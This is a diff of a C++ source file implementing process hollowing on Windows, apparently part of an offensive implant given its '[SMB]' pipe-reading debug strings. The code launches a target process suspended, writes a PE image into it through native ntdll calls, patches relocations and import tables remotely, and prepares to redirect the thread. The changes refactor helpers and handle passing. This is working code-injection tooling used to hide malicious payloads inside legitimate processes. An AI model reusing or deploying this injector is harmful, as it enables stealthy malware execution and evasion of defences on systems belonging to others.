@@ -1,7 +1,9 @@
 // process-hollowing.cpp : This file contains the 'main' function. Program execution begins and ends there.
 //
-#pragma once
 #include "ProcessHollowingPE.h"
+#include <tlhelp32.h>
+#include <psapi.h>
+
 
 _NtWriteVirtualMemory myNtWrite = (_NtWriteVirtualMemory)GetProcAddress(GetModuleHandleA("ntdll"), "NtWriteVirtualMemory");
 _NtReadVirtualMemory myNtRead = (_NtReadVirtualMemory)GetProcAddress(GetModuleHandleA("ntdll"), "NtReadVirtualMemory");
@@ -13,220 +15,6 @@ _NtWaitForSingleObject myNtWaitForSingleObject = (_NtWaitForSingleObject)GetProc
 _NtGetContextThread myNtGetContextThread = (_NtGetContextThread)GetProcAddress(GetModuleHandleA("ntdll"), "NtGetContextThread");
 _NtSetContextThread myNtSetContextThread = (_NtSetContextThread)GetProcAddress(GetModuleHandleA("ntdll"), "NtSetContextThread");
 
-bool readPipe(HANDLE hPipe, PVOID* data, PDWORD dataLen)
-{
-	DWORD bytesSize = 0;
-
-
-	// TODO: first get the size then parse
-	if (PeekNamedPipe(hPipe, NULL, 0, NULL, &bytesSize, NULL))
-	{
-		if (bytesSize > 0)
-		{
-			_dbg("[SMB] BytesSize => %d\n", bytesSize);
-
-			*data = LocalAlloc(LPTR, bytesSize + 1);
-			memset(*data, 0, bytesSize + 1);
-
-			if (ReadFile(hPipe, *data, bytesSize, &bytesSize, NULL))
-			{
-				_dbg("[SMB] BytesSize Read => %d\n", bytesSize);
-
-			}
-			else
-			{
-				_err("[SMB] ReadFile: Failed[%d]\n", GetLastError());
-				DATA_FREE(*data, bytesSize);
-				CloseHandle(hPipe);
-				return false;
-			}
-		}
-	}
-	else
-	{
-		_err("[SMB] PeekNamedPipe: Failed[%d]\n", GetLastError());
-		CloseHandle(hPipe);
-		return false;
-	}
-
-
-	*dataLen = bytesSize;
-	return true;
-}
-
-bool loadPEFromDisk(LPCSTR peName, LPVOID& peContent, PDWORD peSizeReturn)
-{
-	HANDLE hPe = NULL;
-	hPe = CreateFileA(peName, GENERIC_READ, NULL, NULL, OPEN_EXISTING, NULL, NULL);
-	if (hPe == INVALID_HANDLE_VALUE || !hPe)
-	{
-
-		_err("[-] Error PE to load does not exist: %x\r\n", GetLastError());
-		return FALSE;
-
-	}
-	DWORD peSize = GetFileSize(hPe, NULL);
-	*peSizeReturn = peSize;
-
-	_dbg("[+] DLL %s loaded\r\n", peName);
-	_dbg("[+] DLL size: %lu bytes \r\n", peSize);
-
-
-	peContent = LocalAlloc(LPTR, peSize);
-	if (peContent == NULL)
-	{
-
-		_err("[-] ERROR in allocating in HEAP\r\n");
-
-		return FALSE;
-	}
-	if (!ReadFile(hPe, peContent, peSize, NULL, NULL))
-	{
-
-		_err("[-] ERROR copying Dll in HEAP \r\n");
-
-		return FALSE;
-	}
-
-	_dbg("[+] Allocating size of Dll on the HEAP @ 0x%p\r\n", peContent);
-
-	if (!CloseHandle(hPe))
-	{
-
-		_err("[-] ERROR in closing Handle on file %s", peName);
-
-		return FALSE;
-	}
-	return TRUE;
-}
-
-PPE_STRUCT createPEStrcut(PVOID peContent) {
-	PPE_STRUCT myStruct = (PPE_STRUCT)LocalAlloc(LPTR, sizeof(PE_STRUCT));
-	if (!myStruct) {
-		return nullptr;
-	}
-
-	myStruct->imageBase = peContent;
-	myStruct->dosHeader = (PIMAGE_DOS_HEADER)peContent;
-
-	if (myStruct->dosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
-		_err("[-] ERROR: Input file seems to not be a PE\r\n");
-		LocalFree(myStruct);
-		return nullptr;
-	}
-
-	myStruct->ntHeader = (PIMAGE_NT_HEADERS)((PBYTE)peContent + myStruct->dosHeader->e_lfanew);
-
-	myStruct->dataDirectories = (PVOID*)LocalAlloc(LPTR, IMAGE_NUMBEROF_DIRECTORY_ENTRIES * sizeof(PVOID));
-
-	if (!myStruct->dataDirectories) {
-
-		_err("[-] ERROR: in allocating memory for data directories\r\n");
-		LocalFree(myStruct);
-		return nullptr;
-	}
-
-	for (int i = 0; i < IMAGE_NUMBEROF_DIRECTORY_ENTRIES; ++i) {
-		myStruct->dataDirectories[i] = myStruct->ntHeader->OptionalHeader.DataDirectory[i].VirtualAddress + (PBYTE)peContent;
-	}
-
-	myStruct->sections = (PPE_SECTION)LocalAlloc(LPTR, myStruct->ntHeader->FileHeader.NumberOfSections * sizeof(PE_SECTION));
-
-	if (!myStruct->sections) {
-
-		_err("[-] ERROR: in allocating memory for sections\r\n");
-
-		LocalFree(myStruct->dataDirectories);
-		LocalFree(myStruct);
-		return nullptr;
-	}
-
-	PIMAGE_SECTION_HEADER currentPeSection = IMAGE_FIRST_SECTION(myStruct->ntHeader);
-
-	for (int i = 0; i < myStruct->ntHeader->FileHeader.NumberOfSections; i++) {
-		myStruct->sections[i].header = currentPeSection;
-		myStruct->sections[i].addrSection = (PBYTE)peContent + currentPeSection->PointerToRawData;
-		currentPeSection++;
-	}
-
-	return myStruct;
-}
-
-PPE_SECTION getSection(PPE_STRUCT myPE, PCHAR sectionName)
-{
-	for (int i = 0; i < myPE->ntHeader->FileHeader.NumberOfSections; i++)
-	{
-		if (strcmp((PCHAR)myPE->sections[i].header->Name, sectionName) == 0)
-			return &myPE->sections[i];
-	}
-	return nullptr;
-}
-
-DWORD getOffsetFromAddr(PPE_STRUCT myPE, PVOID addr)
-{
-	DWORD calculatedOffset = (DWORD)addr - (DWORD)myPE->imageBase;
-	for (int i = 0; i < myPE->ntHeader->FileHeader.NumberOfSections; i++)
-	{
-		_dbg("Addr: %p -> calculate offset: %x\r\n",addr, (DWORD)addr - (DWORD)myPE->imageBase);
-		_dbg("Section: %s -> %x - %x\r\n",myPE->sections[i].header->Name, myPE->sections[i].header->VirtualAddress, myPE->sections[i].header->VirtualAddress + myPE->sections[i].header->SizeOfRawData);
-		
-		if ( calculatedOffset > myPE->sections[i].header->VirtualAddress && calculatedOffset < myPE->sections[i].header->VirtualAddress + myPE->sections[i].header->SizeOfRawData)
-		{
-			_dbg("Offset found in section %s. Offset of section: %d\r\n", myPE->sections[i].header->Name, myPE->sections[i].header->VirtualAddress - myPE->sections[i].header->PointerToRawData);
-			return myPE->sections[i].header->VirtualAddress - myPE->sections[i].header->PointerToRawData;
-		}
-	}
-	return -1;
-}
-
-PCHAR strConcat(PCHAR str1, PCHAR str2)
-{
-	SIZE_T size1 = strlen(str1);
-	SIZE_T size2 = strlen(str2);
-	PCHAR out = (PCHAR)LocalAlloc(LPTR, size1 + size2 + 2);
-	if (!out)
-		return nullptr;
-	for (int i = 0; i < size1; i++)
-	{
-		out[i] = str1[i];
-	}
-	out[size1] = ' ';
-	for (int i = 0; i < size2; i++)
-	{
-		out[i + size1 + 1] = str2[i];
-	}
-	return out;
-}
-
-bool launchSusprendedProcess(LPSTR processName, LPPROCESS_INFORMATION& pi, PCHAR args, HANDLE& hStdOutPipeRead)
-{
-
-	HANDLE hStdOutPipeWrite = NULL;
-	SECURITY_ATTRIBUTES sa = { sizeof(SECURITY_ATTRIBUTES), NULL, TRUE };
-	STARTUPINFOA si = { 0 };
-
-
-	//Creating Pipe for output of exe
-	if (!CreatePipe(&hStdOutPipeRead, &hStdOutPipeWrite, &sa, 0))
-	{
-		_err("[CMD] Failed Output pipe");
-		return FALSE;
-	}
-
-	// Redirection STDOUT/STDERR into pipe
-	si.cb = sizeof(STARTUPINFOA);
-	si.dwFlags = STARTF_USESTDHANDLES;
-	si.hStdError = hStdOutPipeWrite;
-	si.hStdOutput = hStdOutPipeWrite;
-	PCHAR cmdLine = strConcat(processName, args);
-	if (!CreateProcessA(processName, cmdLine, NULL, NULL, TRUE, CREATE_SUSPENDED, NULL, NULL, &si, pi))
-	{
-		_err("[-] ERROR: Cannot create process %s", processName);
-		return FALSE;
-	}
-	_dbg("[+] Launching process %s with PID: %d\r\n", processName, pi->dwProcessId);
-	return TRUE;
-}
 
 
 bool copyPEinTargetProcess(HANDLE pHandle, LPVOID& allocAddrOnTarget, PPE_STRUCT myPE)
@@ -333,7 +121,6 @@ PWSTR strToWstr(PCHAR str)
 
 BOOL resolveAPISet(PWCHAR apiToResolve, PWCHAR& apiResolved)
 {
-
 	PPEB peb = (PPEB)__readgsqword(0x60);
 	PAPI_SET_NAMESPACE apiMap = (PAPI_SET_NAMESPACE)peb->Reserved9[0];
 	PWSTR ApiStrName = nullptr;
@@ -370,7 +157,6 @@ HANDLE getSnapShotProcess(int pid) {
 	}
 
 	return mod;
-
 }
 
 MODULEENTRY32W getModuleEntry(HANDLE snapShotHandle, PWSTR moduleSearched)
@@ -385,9 +171,11 @@ MODULEENTRY32W getModuleEntry(HANDLE snapShotHandle, PWSTR moduleSearched)
 		{
 			return me32;
 		}
-	} while (Module32Next(snapShotHandle, &me32));
+	} while (Module32NextW(snapShotHandle, &me32));
 	return { 0 };
 }
+
+
 
 PVOID getAddrFunction(HMODULE lib, PCHAR functionName, PCHAR& forwardedLib, PCHAR& forwardedName)
 {
@@ -502,7 +290,7 @@ bool remoteLoadLibrary(HANDLE hProcess, PCHAR libToLoad)
 	return TRUE;
 }
 
-bool loadImportTableLibs(PPE_STRUCT myPE, LPPROCESS_INFORMATION pi, PVOID allocAddrOnTarget)
+bool loadImportTableLibs(PPE_STRUCT myPE, HANDLE hProcess, PVOID allocAddrOnTarget)
 {
 	IMAGE_DATA_DIRECTORY importsDirectory = myPE->ntHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
 	if (importsDirectory.Size <= 20)
@@ -528,7 +316,7 @@ bool loadImportTableLibs(PPE_STRUCT myPE, LPPROCESS_INFORMATION pi, PVOID allocA
 
 		_dbg("[*] library to load: %s\r\n", libName);
 
-		if (!remoteLoadLibrary(pi->hProcess, (PVOID)((PBYTE)allocAddrOnTarget + importDescriptor->Name)))
+		if (!remoteLoadLibrary(hProcess, (PVOID)((PBYTE)allocAddrOnTarget + importDescriptor->Name)))
 			return FALSE;
 
 		lib = LoadLibraryA(libName);
@@ -555,7 +343,7 @@ bool loadImportTableLibs(PPE_STRUCT myPE, LPPROCESS_INFORMATION pi, PVOID allocA
 					if (forwardedLib && forwardedName)
 					{
 						_dbg("Forwarded function found: %s. Need to import lib %s\r\n", functionName->Name, forwardedLib);
-						if (!remoteLoadLibrary(pi->hProcess, forwardedLib))
+						if (!remoteLoadLibrary(hProcess, forwardedLib))
 							return FALSE;
 
 					}
@@ -569,7 +357,7 @@ bool loadImportTableLibs(PPE_STRUCT myPE, LPPROCESS_INFORMATION pi, PVOID allocA
 	return TRUE;
 }
 
-bool loadDelayedImportTableLibs(PPE_STRUCT myPE, LPPROCESS_INFORMATION pi, PVOID allocAddrOnTarget)
+bool loadDelayedImportTableLibs(PPE_STRUCT myPE, HANDLE hProcess, PVOID allocAddrOnTarget)
 {
 
 	IMAGE_DATA_DIRECTORY delayedImportsDirectory = myPE->ntHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_DELAY_IMPORT];
@@ -593,7 +381,7 @@ bool loadDelayedImportTableLibs(PPE_STRUCT myPE, LPPROCESS_INFORMATION pi, PVOID
 		libName = (LPSTR)((PBYTE)myPE->imageBase + delayedImportDescriptor->DllNameRVA - offsetRdata);
 		_dbg("[*] Delayed Import to load: %s\r\n", libName);
 
-		if (!remoteLoadLibrary(pi->hProcess, libName))
+		if (!remoteLoadLibrary(hProcess, libName))
 			return FALSE;
 
 		lib = LoadLibraryA(libName);
@@ -621,7 +409,7 @@ bool loadDelayedImportTableLibs(PPE_STRUCT myPE, LPPROCESS_INFORMATION pi, PVOID
 					if (forwardedLib && forwardedName)
 					{
 						_dbg("Forwarded function found: %s. Need to import lib %s\r\n", functionName->Name, forwardedLib);
-						if (!remoteLoadLibrary(pi->hProcess, forwardedLib))
+						if (!remoteLoadLibrary(hProcess, forwardedLib))
 							return FALSE;
 
 					}
@@ -636,7 +424,7 @@ bool loadDelayedImportTableLibs(PPE_STRUCT myPE, LPPROCESS_INFORMATION pi, PVOID
 	return TRUE;
 }
 
-bool fixImports(PPE_STRUCT myPE, LPPROCESS_INFORMATION pi, PVOID allocAddrOnTarget, HANDLE mod)
+bool fixImports(PPE_STRUCT myPE, HANDLE hProcess, PVOID allocAddrOnTarget, HANDLE mod)
 {
 	_dbg("[*] Fixing Import table\r\n");
 
@@ -686,7 +474,7 @@ bool fixImports(PPE_STRUCT myPE, LPPROCESS_INFORMATION pi, PVOID allocAddrOnTarg
 					PVOID localAddr = (PBYTE)GetProcAddress(lib, functionOrdinal);
 					DWORD offset = (PBYTE)localAddr - (PBYTE)lib;
 					ULONGLONG addrFix = (ULONGLONG)((PBYTE)me32.modBaseAddr + offset);
-					NTSTATUS status = myNtWrite(pi->hProcess, remoteAddr, &addrFix, sizeof(ULONGLONG), NULL);
+					NTSTATUS status = myNtWrite(hProcess, remoteAddr, &addrFix, sizeof(ULONGLONG), NULL);
 					if (status != 0)
 					{
 						_err("Error in fixing address of function number %d -> 0x%x\r\n", thunk->u1.Ordinal, status);
@@ -738,7 +526,7 @@ bool fixImports(PPE_STRUCT myPE, LPPROCESS_INFORMATION pi, PVOID allocAddrOnTarg
 						addrFix = (ULONGLONG)((PBYTE)me32.modBaseAddr + offset);
 					}
 
-					NTSTATUS status = myNtWrite(pi->hProcess, remoteAddr, &addrFix, sizeof(ULONGLONG), NULL);
+					NTSTATUS status = myNtWrite(hProcess, remoteAddr, &addrFix, sizeof(ULONGLONG), NULL);
 					if (status != 0)
 					{
 						_err("Error in fixing address of function %s -> 0x%x\r\n", functionName->Name, status);
@@ -757,7 +545,7 @@ bool fixImports(PPE_STRUCT myPE, LPPROCESS_INFORMATION pi, PVOID allocAddrOnTarg
 	return TRUE;
 }
 
-bool fixDelayedImports(PPE_STRUCT myPE, LPPROCESS_INFORMATION pi, PVOID allocAddrOnTarget, HANDLE mod)
+bool fixDelayedImports(PPE_STRUCT myPE, HANDLE hProcess, PVOID allocAddrOnTarget, HANDLE mod)
 {
 
 	_dbg("[*] Fixing Delayed Import table\r\n");
@@ -808,7 +596,7 @@ bool fixDelayedImports(PPE_STRUCT myPE, LPPROCESS_INFORMATION pi, PVOID allocAdd
 					DWORD offset = (PBYTE)localAddr - (PBYTE)lib;
 					ULONGLONG addrFix = (ULONGLONG)((PBYTE)me32.modBaseAddr + offset);
 
-					NTSTATUS status = myNtWrite(pi->hProcess, remoteAddr, &addrFix, sizeof(ULONGLONG), NULL);
+					NTSTATUS status = myNtWrite(hProcess, remoteAddr, &addrFix, sizeof(ULONGLONG), NULL);
 					if (status != 0)
 					{
 						_err("Error in fixing address of function number %d -> 0x%x\r\n", thunkName->u1.Ordinal, status);
@@ -860,7 +648,7 @@ bool fixDelayedImports(PPE_STRUCT myPE, LPPROCESS_INFORMATION pi, PVOID allocAdd
 						addrFix = (ULONGLONG)((PBYTE)me32.modBaseAddr + offset);
 					}
 
-					NTSTATUS status = myNtWrite(pi->hProcess, remoteAddr, &addrFix, sizeof(ULONGLONG), NULL);
+					NTSTATUS status = myNtWrite(hProcess, remoteAddr, &addrFix, sizeof(ULONGLONG), NULL);
 					if (status != 0)
 					{
 						_err("Error in fixing address of function %s -> 0x%x\r\n", functionName->Name, GetLastError());
@@ -878,8 +666,6 @@ bool fixDelayedImports(PPE_STRUCT myPE, LPPROCESS_INFORMATION pi, PVOID allocAdd
 		delayedImportDescriptor++;
 	}
 
-
-	CloseHandle(mod);
 	return TRUE;
 
 }
@@ -906,10 +692,12 @@ int main(int argc, char** argv)
 		exit(1);
 
 	PPE_STRUCT myPE = createPEStrcut(peToInjectContent);
-	if (myPE->sections == NULL)
-		printf("Herror HERE");
-
-
+	if (!myPE)
+	{
+		_err("Error in parsing PE\r\n");
+		exit(1);
+	}
+		
 
 	if (!launchSusprendedProcess((LPSTR)target, pi, (PCHAR)args, hStdOut))
 		exit(1);
@@ -927,31 +715,30 @@ int main(int argc, char** argv)
 	_dbg("[+] Memory allocate at : 0x%p\n", allocAddrOnTarget);
 
 
-
-	DWORD offsetRdata = 0;
-
 	if (!copyPEinTargetProcess(pi->hProcess, allocAddrOnTarget, myPE))
 		exit(1);
 
 	if (!fixRelocTable(pi->hProcess, myPE, allocAddrOnTarget, DeltaImageBase))
 		exit(1);
 
-	if (!loadImportTableLibs(myPE, pi, allocAddrOnTarget))
+	if (!loadImportTableLibs(myPE, pi->hProcess, allocAddrOnTarget))
 		exit(1);
 
 	
 
-	if (!loadDelayedImportTableLibs(myPE, pi, allocAddrOnTarget))
+	if (!loadDelayedImportTableLibs(myPE, pi->hProcess, allocAddrOnTarget))
 		exit(1);
 
 
 	HANDLE mod = getSnapShotProcess(pi->dwProcessId);
 
-	if (!fixImports(myPE, pi, allocAddrOnTarget, mod))
+	if (!fixImports(myPE, pi->hProcess, allocAddrOnTarget, mod))
 		exit(1);
 
-	if (!fixDelayedImports(myPE, pi, allocAddrOnTarget, mod))
+	if (!fixDelayedImports(myPE, pi->hProcess, allocAddrOnTarget, mod))
 		exit(1);
+
+	CloseHandle(mod);
 
 	CONTEXT CTX = {};
 	CTX.ContextFlags = CONTEXT_FULL;
